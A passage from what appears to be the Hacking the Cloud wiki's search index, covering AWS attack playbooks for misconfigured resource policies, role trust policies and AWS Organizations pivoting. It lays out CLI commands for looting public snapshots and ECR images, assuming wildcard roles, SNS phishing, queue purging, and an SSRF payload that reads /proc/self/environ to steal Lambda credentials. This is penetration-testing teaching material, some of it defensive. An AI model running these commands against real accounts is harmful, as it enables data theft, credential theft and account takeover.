description\naws ec2 describe-snapshots --filter \"Name=description,Values=*hackingthe.cloud*\"\n\n# Create volume from snapshot\n# The availability zone must be the same as the instance we \n# will create shortly in order to attach the new volume there\naws ec2 create-volume --availability-zone $region'a' --snapshot-id snap-example1234567890\n\n# Alternatively you can try to copy the Snapshot and\n# operate with ti from there\n# aws ec2 copy-snapshot --source-snapshot-id snap-example1234567890 --source-region $region\n\n# Check if status is 'ok'\n# Volume id is from the 'create-volume' API call\naws ec2 describe-volume-status --volume-id $volume_id\n\n# Start a new EC2 instance in the same Availability Zone\n# The Image Id is for an Amazon Linux image and has\n# nothing to do with the public AMI from the previous section\n# Create a security group that allows all inbound traffic if\n# you don't already have one and use it here\naws ec2 run-instances --security-group-ids sg-example1234567890 --instance-type t2.micro --placement AvailabilityZone=$region'a' --image-id ami-example1234567890\n\n# Attach volume to your instance and specify as device\n# anything from /dev/sdf to /dev/sdp (you can use /dev/sdf)\n# --instance-id is from 'run-instances' API call\naws ec2 attach-volume --volume-id $volume_id --instance-id $instance_id --device /dev/sdf\n\n# Connect to the instance\naws ec2-instance-connect ssh --os-user root --instance-id $instance_id\n# Mount the volume\n# lsblk\n# mount /dev/sdf1 /mnt\n# Search the volume for files and secrets \n\n# Terminate the instance when you're done\naws ec2 terminate-instances --instance-ids $instance_id\n\n# Delete the volume created\naws ec2 delete-volume --volume-id $volume_id\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#rds-snapshots","title":"RDS Snapshots","text":"<pre><code># Depending on the engine of the target snapshot, you'll have to install\n# the tool for connecting to the RDS server\n# We'll use MySQL in this example \n\n# Search based on AWS account id using jq\n# because there is no native way to do this\n# Copy the DBSnapshotIdentifier\naws rds describe-db-snapshots --include-public | jq '.DBSnapshots[] | select(.DBSnapshotArn | contains(\"123456789012:\"))'\n\n# Restore Snapshot\n# Use the DBSnapshotIdentifier from above and create\n# a security group that allows all inbound traffic if\n# you don't already have one and use it here\n# $db_instance_identifier should be a new custom name for\n# the new db \naws rds restore-db-instance-from-db-snapshot --db-instance-identifier $db_instance_identifier \\\n    --db-snapshot-identifier $db_snapshot_identifier \\\n    --vpc-security-group-ids sg-example1234567890 --publicly-accessible --no-multi-az\n\n# This will take around 5-15 minutes so you can run this\n# command to know when the database was restored\n# The DB Instance Identifier should be the same, but you\n# can get it from the output of the previous command\naws rds wait db-instance-available --db-instance-identifier $db_instance_identifier\n\n# Change login password\n# In the response you will also see the RDS\n# endpoint address. Copy that for connecting\n# to the instance. The username for login can\n# be found in the same response under \"MasterUsername\"\naws rds modify-db-instance \\\n    --db-instance-identifier $db_instance_identifier \\\n    --master-user-password MyNewPassword123! \\\n    --apply-immediately\n\n# Connect to the database\nmysql -h $url_db -u $username --skip-ssl -p\n# show databases;\n# use $database;\n# show tables;\n\n# Delete RDS instance\naws rds delete-db-instance --db-instance-identifier $db_identifier --skip-final-snapshot\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#iam-roles","title":"IAM Roles","text":"<p>There are roles that can be assumed using various 3rd-party technologies if the role's trust policy is misconfigured.</p> <p>Documented attacks on bad OIDC configurations: - GitHub - Terraform Cloud - GitLab</p> <p>While the OIDC misconfigurations can be exploited from the internet, the attacks are more complex than what this document aims to help with. Please reefer to the original or related articles around the aforementioned attacks.</p> <pre><code># Assuming a public role\nrole_name=example-role\n# Try to assume role\naws sts assume-role \\\n    --role-arn arn:aws:iam::123456789012:role/$role_name \\\n    --role-session-name any-name\n\n# Configure returned credentials\naws --profile any-name configure set aws_access_key_id $access_key_id\naws --profile any-name configure set aws_secret_access_key $secret_access_key\naws --profile any-name configure set aws_session_token $session_token\n\n# Validate credentials\naws --profile any-name sts get-caller-identity\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#ssm-documents","title":"SSM Documents","text":"<pre><code># Search by name prefix\naws ssm list-documents --filters \"Key=Owner,Values=Public\" \"Key=Name,Values=hackingthe.cloud\"\n\n# Search by owner with jq\n# Takes 15-30 seconds to execute\n# Copy the value from the \"Name\" field\naws ssm list-documents --filters \"Key=Owner,Values=Public\" | jq '.DocumentIdentifiers[] | select(.Owner | contains(\"123456789012\"))'\n\n# List document versions\n# Different versions can have different\n# secrets or details\naws list-document-versions --name $document_name\n\n# Get document details\n# If the document has more versions you can use --document-version $number\n# to get details about that version\n# If version is not specified then the default one is used\naws ssm describe-document --name $document_name\n\n# Get the actual content of the document\n# Use --document-version $number if multiple versions\naws ssm get-document --name $document_name\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#cloudfront","title":"CloudFront","text":"<p>If the CloudFront distribution has as origin a misconfigured S3 bucket, then even if the bucket is configured to block public access, it might be possible to list the bucket by accessing the distribution's URL. In order for this to work the bucket policy needs to allow \"s3:ListBucket\" for the CloudFront's Origin Access Identity (OAI). Most likely you will not encounter this outside a lab.</p> <pre><code># Try to list the bucket (Should not work)\n# You won't know the bucket if you only have the distribution's URL\naws s3 ls s3://example-bucket\n\n# Access the distribution and list the files\ncurl https://example1234567.cloudfront.net\n\n# Read sensitive files\ncurl https://example1234567.cloudfront.net/$file\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#2-cant-be-found-from-a-black-box-perspective","title":"2. Can't be found from a black-box perspective","text":"<p>These services can't be identified from a purely black-box perspective (exception the Public ECR), but they can be misconfigured so that they can be accessed from any external AWS account. For most of these services you need additional information that most likely you'll not find from the internet, brute-forcing or similar techniques. </p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#sns-topics","title":"SNS Topics","text":"<pre><code># List topic subscribers\n# This will return the subscribers which can be\n# email addresses or other services like SQS queues\n# that might be public as well\naws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:$region:123456789012:example-topic\n\n# Get topic attributes\naws sns get-topic-attributes --topic-arn arn:aws:sns:$region:123456789012:example-topic\n\n# Subscribe to the topic\n# If you subscribe you will get a confirmation\n# email with a link you have to access\n# After confirming you will receive any messages sent\n# to the topic\naws sns subscribe --topic-arn arn:aws:sns:$region:123456789012:example-topic \\\n        --protocol email \\\n        --notification-endpoint $email_address\n\n\n# Publish to topic\n# All subscribers will receive this message\n# This can be leveraged to perform phishing attacks\naws sns publish --topic-arn arn:aws:sns:$region:123456789012:example-topic --message \"This is the email body\" --subject \"This is the email subject\"\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#sqs-queues","title":"SQS Queues","text":"<pre><code># Send message\naws sqs send-message \\\n    --queue-url https://sqs.$region.amazonaws.com/123456789012/example-queue \\\n    --message-body \"Your message\"\n\n# Receive messages\n# This will remove the message from the queue\naws sqs receive-message --queue-url https://sqs.$region.amazonaws.com/123456789012/example-queue\n\n# Delete message\n# Message will be deleted anyway when\n# running receive-message in default implementations\naws sqs delete-message \\\n    --queue-url https://sqs.$region.amazonaws.com/123456789012/example-queue \\\n    --receipt-handle $big_string_from_receive_message_call\n\n# This will delete all items in the queue\naws sqs purge-queue --queue-url https://sqs.$region.amazonaws.com/123456789012/example-queue\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#private-api-gateways","title":"Private API Gateways","text":"<p>A private API Gateway is private in the sens that it can't be accessed from outside the AWS's network. People can mistake a private API Gateway as being accessible only from their AWS account, which is a common misconception. </p> <pre><code># Example API Gateway details\napi_id=example123\nregion=eu-central-1\nstage=prod\nendpoint=fetch\n\n# Try to access the API gateway from your host/VM\n# It should not work\ncurl https://$api_id.execute-api.$region.amazonaws.com/$stage/$endpoint\nnslookup $api_id.execute-api.$region.amazonaws.com\n\n# We'll start an EC2 instance and perform the # request from there\n# The instance must be in the same region as the target API\n# Create a security group that allows all inbound traffic if\n# you don't already have one and use it here\n# The AMI is for the latest Amazon Linux image at the moment of writing this article\n# Save the instance ID for later\naws --region $region ec2 run-instances --security-group-ids sg-example1234567 --instance-type t2.micro --image-id ami-0b5673b5f6e8f7fa7\n\n# Check if you have VPC endpoint com.amazonaws.$region.execute-api\naws --region $region ec2 describe-vpc-endpoints\n\n# Skip this if the VPC endpoint already exist\n# Create the VPC Endpoint\n# Should take around 1-2 minutes to be available\n# Run either 'aws ec2 describe-instances' or\n# 'aws ec2 describe-vpcs' or 'aws-describe-subnets' in order\n# to get the information about the VPC id along with the subnet ids\n# You have to use the same VPC as the one of the previous EC2\n# Create a security group that allows all inbound traffic if\n# you don't already have one and use it here\naws ec2 create-vpc-endpoint \\\n    --vpc-id vpc-example1234567 \\\n    --vpc-endpoint-type Interface \\\n    --service-name com.amazonaws.$region.execute-api \\\n    --subnet-ids subnet-example1234567,subnet-example1234567,subnet-example1234567 \\\n    --security-group-ids sg-example1234567 \\\n    --private-dns-enabled\n\n# Connect to the instance\naws ec2-instance-connect ssh --os-user root --instance-id $instance_id\n</code></pre> <pre><code># Now we should be able to resolve and invoke the private API Gateway\n# Check DNS resolution\nnslookup $api_id.execute-api.$region.amazonaws.com\n\n# Invoke the API\ncurl https://$api_id.execute-api.$region.amazonaws.com/$stage/$endpoint\n</code></pre> <p>Delete the instance and the VPC Endpoint when you're done. VPC Endpoints can get expensive.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#lambda-functions","title":"Lambda Functions","text":"<pre><code>function_name=example-function\n# Invoke function via AWS CLI\n# Because the function is from an external account, the\n# whole ARN must be specified\n# You can invoke a certain version of the function by adding its number at the end\n# e.g. arn:aws:lambda:$region:123456789012:function:$function_name:1\naws lambda invoke --function-name arn:aws:lambda:$region:123456789012:function:$function_name \\\n    --payload '&lt;input&gt;'\n\n# If the function is vulnerable to SSRF you might\n# be able to exfiltrate the access credentials by reading\n# the contents of /proc/self/environ\n# For this you need to specify --cli-binary-format\n# This is can be used as a persistence technique\naws lambda invoke --function-name arn:aws:lambda:$region:123456789012:function:$function_name \\\n    --payload '{\"queryStringParameters\":{\"url\":\"file:///proc/self/environ\"}}' \\                                               \n    --cli-binary-format raw-in-base64-out output.txt\n\n# Invoke the function by its URL\n# Just because the Lambda Function can be invoked\n# by anyone, doesn't mean it will have a public URL\n# There is no known way to reverse the function URL\n# to get the function ARN or vice-versa\ncurl https://examplexample12345678901234567890exa.lambda-url.$region.on.aws/?url=file:///proc/self/environ &gt; output.txt\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#ecr-repositories","title":"ECR Repositories","text":""},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#private-repository-access","title":"Private Repository Access","text":"<p>Even if the repository is private, it can be misconfigured so that it allows any other AWS account to access it.</p> <pre><code># Login first\n# This command might not work on Windows\naws ecr get-login-password | docker login \\\n    --username AWS \\\n    --password-stdin 123456789012.dkr.ecr.$region.amazonaws.com/example-private\n\n# Pull image\ndocker pull 123456789012.dkr.ecr.$region.amazonaws.com/example-private:latest\n\n# Inspect image for secrets\n# You can search the image in multiple ways\ndocker history 123456789012.dkr.ecr.$region.amazonaws.com/example-private:latest --no-trunc\ndocker inspect 123456789012.dkr.ecr.$region.amazonaws.com/example-private:latest\ndocker run -it 123456789012.dkr.ecr.$region.amazonaws.com/example-private:latest cat /etc/environment\n\n# You can even push a new version of the image\n# if the ECR is that badly misconfigured\ndocker push 123456789012.dkr.ecr.$region.amazonaws.com/example-private:latest\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#public-repository-access","title":"Public Repository Access","text":"<p>This is the case where the company created a public repository instead of a private one. Compared with the other services from section 3, this one can be found from a black-box perspective.</p> <pre><code># You can find the repository by searching it\n# https://gallery.ecr.aws/search?searchTerm=hackingthe.cloud\n\n# Login\n# The public ECR is available only in us-east-1\naws ecr-public get-login-password --region us-east-1 | docker login \\\n    --username AWS \\\n    --password-stdin public.ecr.aws/id123456/example-public\n\n\n# Pull public image\ndocker pull public.ecr.aws/id123456/example-public\n\n# Inspect image for secrets\n# You can search the image in multiple ways\ndocker history public.ecr.aws/id123456/example-public --no-trunc\ndocker inspect public.ecr.aws/id123456/example-public\ndocker run -it 1public.ecr.aws/id123456/example-public cat /etc/environment\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#call-for-contributions","title":"Call for contributions","text":"<p>Do you know other relevant services that can be misconfigured so that they grant read, write or execute permissions over their resources? Feel free to add or suggest them.</p> <p>One service that should be included in this document is AWS Cognito. However, recently AWS performed some changes over how Cognito can be configured and further analysis is required before I can vouch for the attacks against it.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/","title":"Abusing Misconfigured ECR Resource Policies","text":"<p>AWS Elastic Container Registry (ECR) private repositories use resource-based policies to delineate which entities are permitted to push and pull containers. As a result, it is possible for these policies to be misconfigured and potentially abused. The following are some examples of possible misconfigurations and the required permissions needed to take advantage of them.</p> <p>Note</p> <p>Aside from the wildcard principal, you should also be mindful of overbroad permissions in general, such as permitting an entire AWS account to have access.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#understanding-ecrgetauthorizationtoken","title":"Understanding ecr:GetAuthorizationToken","text":"<p>A unique requirement to abusing misconfigured resource-based policies in ECR is ecr:GetAuthorizationToken. The attacking entity must have this permission via an identity-based policy, it cannot be permitted via a resource-based policy (even if the <code>Action</code> element is <code>ecr:*</code>). For scenarios in which the policy has a wildcard principal and a broken policy, this is not a problem as you can create a role with the needed permission.</p> <p>Note</p> <p>When interacting with an ECR private repository via the Docker cli, you use ecr:GetLoginPassword to authenticate. This calls <code>ecr:GetAuthorizationToken</code> to provide the needed authorization.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#downloading-containers","title":"Downloading Containers","text":"<p>Required Permissions: ecr:GetLoginPassword, ecr:BatchGetImage, ecr:GetDownloadURLForLayer.</p> <p>As an example, take the following misconfigured resource policy for an ECR private repository.</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowAll\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": [\n        \"ecr:BatchGetImage\",\n        \"ecr:GetDownloadUrlForLayer\"\n      ]\n    }\n  ]\n}\n</code></pre> <p>This policy would permit us the ability to download containers from the vulnerable repository to our own account. We can take advantage of this with the following commands. First, we need to authenticate to the repository.</p> <pre><code>aws ecr get-login-password --region &lt;region&gt; | docker login --username AWS --password-stdin &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com\n</code></pre> <p>Next, we will pull the container with the following command.</p> <pre><code>docker pull &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repository name&gt;:vulnerable\n</code></pre> <p>We can now loot this container for source code or other valuable information.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#uploading-containers","title":"Uploading Containers","text":"<p>Required Permissions: ecr:GetLoginPassword, ecr:InitiateLayerUpload, ecr:UploadLayerPart, ecr:BatchCheckLayerAvailability, ecr:CompleteLayerUpload, ecr:PutImage.</p> <p>Info</p> <p>As an anecdotal aside, the number of permissions required to perform a container upload may inadvertently increase the likelihood of a <code>Principal</code> being set to <code>*</code>. If you're a developer or ops person just trying to get something done, it may be enticing to set it to a wildcard and be done with it/forget about it.</p> <p>As an example, take the following misconfigured resource policy for an ECR private repository.</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"ExamplePolicy\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": \"ecr:*\"\n    }\n  ]\n}\n</code></pre> <p>This policy would permit us the ability to upload containers to the repository from our own account. We can take advantage of this with the following commands. First, we need to authenticate to the repository.</p> <pre><code>aws ecr get-login-password --region &lt;region&gt; | docker login --username AWS --password-stdin &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com\n</code></pre> <p>Next, we need to create/choose a container to upload. In a real world scenario you would likely want to create a container which runs your C2 of choice, or perhaps a simple script to retrieve IAM credentials. For this example, we will use an Ubuntu container.</p> <pre><code>docker tag ubuntu:latest &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repository name&gt;:vulnerable\n</code></pre> <p>And finally we push the container into the repository.</p> <pre><code>docker push &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repository name&gt;:vulnerable\n</code></pre> <p>Now we simply have to wait for a service (ECS, EKS, EC2, Lambda, etc.) to pull this malicious container and execute it, giving us access to that environment.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#identification","title":"Identification","text":"<p>To find exposed ECR private repositories you can use Prowler, an open source tool to audit for AWS security. The following command can be used with version 3.0 or higher.</p> <pre><code>./prowler -c ecr_repositories_not_publicly_accessible\n                         _\n _ __  _ __ _____      _| | ___ _ __\n| '_ \\| '__/ _ \\ \\ /\\ / / |/ _ \\ '__|\n| |_) | | | (_) \\ V  V /| |  __/ |\n| .__/|_|  \\___/ \\_/\\_/ |_|\\___|_|v3.0-beta-21Nov2022\n|_| the handy cloud security tool\n\nDate: 2022-11-26 19:12:03\n\nThis report is being generated using credentials below:\n\nAWS-CLI Profile: [default] AWS Filter Region: [all]\nAWS Account: [000000000000] UserId: [AROAQQPLEQBZZHQGGAQ55:Nick]\nCaller Identity ARN: [arn:aws:sts::000000000000:assumed-role/snip/Nick]\n\nExecuting 1 checks, please wait...\n\n-&gt; Scan is completed! |\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589| 1/1 [100%] in 4.5s \n\nOverview Results:\n\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n\u2502 100.0% (1) Failed \u2502 0.0% (0) Passed \u2502\n\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n\nAccount 009619941490 Scan Results (severity columns are for fails only):\n\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n\u2502 Provider   \u2502 Service   \u2502 Status   \u2502   Critical \u2502   High \u2502   Medium \u2502   Low \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 aws        \u2502 ecr       \u2502 FAIL (1) \u2502          1 \u2502      0 \u2502        0 \u2502     0 \u2502\n\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n</code></pre> <p>Note</p> <p><code>Condition</code> elements may induce false positives.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_iam_role_trust_policy_wildcard_principal/","title":"Abusing Misconfigured Role Trust Policies with a Wildcard Principal","text":"<p>As penetration testers and red teamers we often take advantage of misconfigurations to exploit cloud environments. These are mistakes made by developers and DevOps engineers that make applications and services vulnerable to attack. In this article we will explore one of the more egregious mistakes that can be made in an AWS environment; setting a wildcard as a <code>Principal</code> in a role trust policy.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_iam_role_trust_policy_wildcard_principal/#role-trust-policies","title":"Role Trust Policies","text":"<p>As stated in the AWS documentation, a role trust policy is, \"A JSON policy document in which you define the principals that you trust to assume the role. A role trust policy is a required resource-based policy that is attached to a role in IAM\".</p> <p>This policy typically looks like the following:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::111111111111:root\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre> <p>This policy would <code>Allow</code> anyone in the <code>111111111111</code> account the ability to perform the action <code>sts:AssumeRole</code> (assume the role), provided that they have the action in their IAM identity-based policy.</p> <p>As mentioned in our documentation on Misconfigured Resource Based Policies, there are a variety of options that can be used for the <code>Principal</code> element, including, AWS accounts, specific IAM roles, role sessions, IAM users, and AWS services. Arguably the most risky is the \"wildcard\" <code>Principal</code>. This <code>Principal</code> encompasses ALL AWS principals. </p> <p>Warning</p> <p>A common misunderstanding is that the wildcard <code>Principal</code> is limited to either the same AWS account or the same AWS organization. This is not correct. The wildcard <code>Principal</code> applies to EVERY AWS account.</p> <p>If a role trust policy is configured with a wildcard <code>Principal</code> element, such as the one shown below, anyone in the world can assume the role.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"*\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre> <p>It's worth noting that, while the simplest version of this misconfiguration can be easy to spot, more complex versions you will see in the wild may not be. Take the following policy for example:</p> <p>Warning</p> <p>Do NOT use this trust policy.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"*\"\n            },\n            \"Action\": \"sts:AssumeRole\",\n            \"Condition\": {\n                \"ArnNotEquals\": {\n                    \"aws:PrincipalArn\": \"arn:aws:iam::555555555555:role/intent-allow-role\"\n                }\n            }\n        }\n    ]\n}\n</code></pre> <p>In this example, the intention was to create a policy that Denied all Principals except the <code>intent-allow-role</code>. However, while creating this policy, the <code>Effect</code> was mistakenly changed to an <code>Allow</code>, which had the opposite effect, now anyone except <code>intent-allow-role</code> can assume the role.</p> <p>These types of more complicated role trust policies may slip through some CSPM/CNAPP solutions which don't thoroughly model all IAM policies. Be on the lookout for these types of mistakes on your next assessment!</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_iam_role_trust_policy_wildcard_principal/#how-to-exploit","title":"How to Exploit","text":"<p>In order to exploit a role that has a wildcard set as a <code>Principal</code>, you simply invoke sts:AssumeRole from an attacker controlled AWS account. Any AWS account, including those outside of the victim's AWS Organization, will work.</p> <pre><code>aws sts assume-role \\\n--role-arn arn:aws:iam::222222222222:role/victim-role \\\n--role-session-name blahsessionname\n</code></pre> <p>Tip</p> <p>There are various methods to enumerate role ARNs such as unauthenticated brute force, and enumerating an ARN from a unique identifier.</p>"},{"location":"aws/general-knowledge/aws_cli_tips_and_tricks/","title":"AWS CLI Tips and Tricks","text":""},{"location":"aws/general-knowledge/aws_cli_tips_and_tricks/#standard-inputoutput-redirection-with-","title":"Standard Input/Output Redirection with \"-\"","text":"<p>Warning</p> <p>The following examples have been tested in bash and zsh. Functionality may vary in other shells. If you find these commands work in additional environments, please open a pull request to update this note.</p> <p>When working in an AWS environment, you may frequently need to view the contents of objects stored in S3. The traditional approach involves a two-step process: using s3:cp to download the file to your local machine, then using <code>cat</code> or a similar tool to view it. While effective, this method can clutter your local system with temporary files and may be slower than necessary.</p> <p>Fortunately, the AWS CLI allows us to simplify this process by using the <code>-</code> character which represents standard input/output (STDIN/STDOUT). Using <code>-</code>, you can read or write file content directly from or to S3 without creating local copies.</p>"},{"location":"aws/general-knowledge/aws_cli_tips_and_tricks/#reading-from-s3","title":"Reading from S3","text":"<p>To read the contents of an object stored in S3 without having to download it first, use the following command:</p> <pre><code>aws s3 cp s3://bucket-name/object-key -\n</code></pre> <p>Example:</p> <pre><code>nick@host:~$ aws s3 cp s3://hackingthecloud/content -\nhacking the cloud\n</code></pre>"},{"location":"aws/general-knowledge/aws_cli_tips_and_tricks/#writing-to-s3","title":"Writing to S3","text":"<p>To upload content directly to an object in S3 without a temporary file, use this command:</p> <pre><code>echo \"hacking the cloud\" | aws s3 cp - s3://bucket-name/object-key\n</code></pre> <p>This command writes the specified text to an S3 object, again bypassing the need for a local file.</p>"},{"location":"aws/general-knowledge/aws_cli_tips_and_tricks/#modifying-the-cloudtrail-log-user-agent-with-aws_execution_env","title":"Modifying the CloudTrail Log User-Agent with <code>AWS_EXECUTION_ENV</code>","text":"<p>Shout-out</p> <p>Shout-out to Christophe Tafani-Dereeper for showing me this.</p> <p>When making API calls to AWS, a <code>User-Agent</code> header is included in each request, containing details about the client making the request. Although it\u2019s not possible to fully customize this header, you can append information to it, which can be useful for tracking API calls in CloudTrail logs.</p> <p>One way to modify the <code>User-Agent</code> is by setting the <code>AWS_EXECUTION_ENV</code> environment variable, used by AWS SDKs to identify the execution environment. Tools like grimoire leverage this variable to append custom information to the <code>User-Agent</code> header, making API tracking more informative.</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/","title":"AWS Organizations Defaults & Pivoting","text":"<ul> <li> <p> Original Research</p> <p> <p>Pivoting AWS Organizations 1 &amp; Pivoting AWS Organizations 2 by Scott Weston</p> <p></p> </p> </li> </ul> <p>Almost all mid-to-large sized AWS environments make use of multi-account architecture. Using multiple AWS accounts offers a number of benefits and is considered a best practice. To help organize and manage those accounts, AWS offers a service called AWS Organizations.</p> <p>Due to the ubiquity of AWS Organizations, it is important for Penetration Testers and Red Teamers to familiarize themselves with its default configuration. </p> <p>When an account creates an organization it becomes the management account of that organization. Each organization has one management account, and this account effectively \"owns\" the organization.</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#creating-member-accounts-default-organizationaccountaccessrole","title":"Creating Member Accounts: Default OrganizationAccountAccessRole","text":"<p>When an account is created through AWS Organizations, it is considered a member of the organization (hence, member account). As a part of this account creation process, AWS Organizations will create a role in the member account called <code>OrganizationAccountAccessRole</code>. This role is created in each member account.</p> <p>By default, the <code>OrganizationAccountAccessRole</code> has the <code>AdministratorAccess</code> policy attached to it, giving the role complete control over the member account. In addition, the default trust policy on the role is as shown below where <code>000000000000</code> is the account ID of the management account.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::000000000000:root\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre> <p>These things combined mean that, should an attacker compromise the management account, the default behavior of AWS Organizations provides a path to compromise every account in the organization as an administrator, assuming that the member account was created through AWS organizations (as opposed to invited). For offensive security professionals, identifying paths into the management account can be an incredibly fruitful exercise, and may result in an entire organization compromise.</p> <p>For defensive security teams, it would be a good idea to ensure no infrastructure is deployed into the management account to reduce attack surface. Additionally, carefully controlling who has access to it and monitoring that access would also help to reduce risk.</p> <p>Scott Weston has added a module to Pacu to brute force this role name or a list of role names. So if a management account is compromised, and the user wants to attempt to assume one to many role names on all accounts, they can run the following Pacu Module</p> <pre><code>Pacu (role:ManagementAccount) &gt; run organizations__assume_role\n[ Review the results to see if any of the following roles are assumed] \n</code></pre>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#inviting-pre-existing-member-accounts-trusted-access-delegated-administration","title":"Inviting Pre-Existing Member Accounts: Trusted Access &amp; Delegated Administration","text":"<p>When a pre-existing AWS account is invited to join an organization, it does not auto-generate a default role with AdministratorAccess like the account creation workflow. As a pentester, one can look into trusted access and delegated administration to see if there are any more avenues to pivot such that you can move from the compromised management 